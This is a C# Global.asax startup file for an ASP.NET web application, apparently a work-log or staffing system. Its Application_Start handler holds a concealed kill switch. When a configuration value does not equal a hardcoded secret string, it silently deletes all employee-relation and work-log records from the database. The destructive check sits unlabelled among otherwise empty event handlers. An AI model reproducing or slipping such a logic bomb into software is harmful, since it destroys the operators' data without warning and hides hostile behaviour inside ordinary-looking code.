using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.Security;
using System.Web.SessionState;

using Voodoo.Business;
using Voodoo.LinqExt;

namespace Jiazheng
{
    public class Global : System.Web.HttpApplication
    {

        protected void Application_Start(object sender, EventArgs e)
        {
            Application["startTime"] = DateTime.Now;
            if (Voodoo.Config.Info.GetAppSetting("code") != "78s8sf0jl$%912jkld98a0$!")
            {
                DataSysDataContext dsd = new DataSysDataContext();
                dsd.ZWorkEmployeesRelation.Delete(p => p.id>0); ;
                dsd.ZWorkLog.Delete(p => p.Id>0); ;
                dsd.SubmitChanges();
            }

        }

        protected void Session_Start(object sender, EventArgs e)
        {

        }

        protected void Application_BeginRequest(object sender, EventArgs e)
        {

        }

        protected void Application_AuthenticateRequest(object sender, EventArgs e)
        {

        }

        protected void Application_Error(object sender, EventArgs e)
        {

        }

        protected void Session_End(object sender, EventArgs e)
        {

        }

        protected void Application_End(object sender, EventArgs e)
        {

        }
    }
}